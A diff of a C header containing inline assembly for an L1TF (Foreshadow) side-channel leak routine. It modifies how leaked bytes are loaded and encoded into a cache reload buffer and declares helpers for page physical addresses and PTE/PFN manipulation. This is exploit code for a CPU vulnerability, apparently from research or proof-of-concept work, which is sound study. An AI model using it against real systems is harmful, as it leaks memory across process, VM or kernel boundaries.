@@ -65,10 +65,7 @@ asm_l1tf_leak_2_highest_bytes(void *leak_addr, two_byte_reload_buffer reload_buf
                    "movl $0xB1ABE849, %%r12d\n"
                    "movl $0xCD7E16F1, %%r13d\n"
                    "leaq handler%=(%%rip), %%r14\n"
-                   "movq (%[leak_addr]), %%rax\n"
-                   // Only grab the upper two bytes
-                   "shr $0x30, %%rax\n"
-                   // Extend it to a page
+                   "mov (%[leak_addr]), %%ax\n"
                    "shl $0xc, %%rax\n"
                    "prefetcht0 (%[reload_buffer], %%rax)\n"
                    "mfence\n"
@@ -153,7 +150,7 @@ uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]);
 
 typedef struct {
   // The virtual address that will be passed to the l1tf leaking code
-  void *leak;
+  char *leak;
   // The original pfn before we started to modify it
   size_t original_pfn;
   // A pointer to PTE of the virtual address in the the
@@ -182,3 +179,8 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts);
 void *l1tf_spawn_leak_page(void);
 
 int l1tf_main(int argc, char *argv[argc]);
+
+////////////////////////////////////////////////////////////////////////////////
+
+uintptr_t l1tf_find_page_pa(void *p);
+void l1tf_init(void);
